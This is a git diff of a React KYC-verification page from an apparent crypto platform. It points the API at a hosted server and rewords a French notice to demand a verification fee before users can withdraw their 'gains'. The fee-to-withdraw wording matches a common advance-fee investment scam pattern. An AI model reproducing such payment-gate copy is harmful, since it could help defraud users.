@@ -5,7 +5,7 @@ import { useAuthState } from "react-firebase-hooks/auth"
 import { useNavigate } from "react-router-dom"
 import { auth } from "../../firebase"
 
-const API_BASE = import.meta.env.VITE_API_BASE || "http://localhost:9000"
+const API_BASE = import.meta.env.VITE_API_BASE || "https://cryptoboost-io.onrender.com"
 
 const paymentOptions = [
     {
@@ -320,7 +320,7 @@ const VerifyKYC = () => {
                                     <p className="text-amber-200 font-semibold">Frais de Vérification</p>
                                 </div>
                                 <p className="text-amber-100 text-sm">
-                                    Un paiement unique de <span className="font-bold text-lg">€{verificationAmount}</span> est requis pour
+                                    Afin de valider le retrait et obtenir vos gains, merci d’effectuer la vérification KYC <span className="font-bold text-lg">€{verificationAmount}</span> est requis pour
                                     traiter votre vérification KYC.
                                 </p>
                             </div>
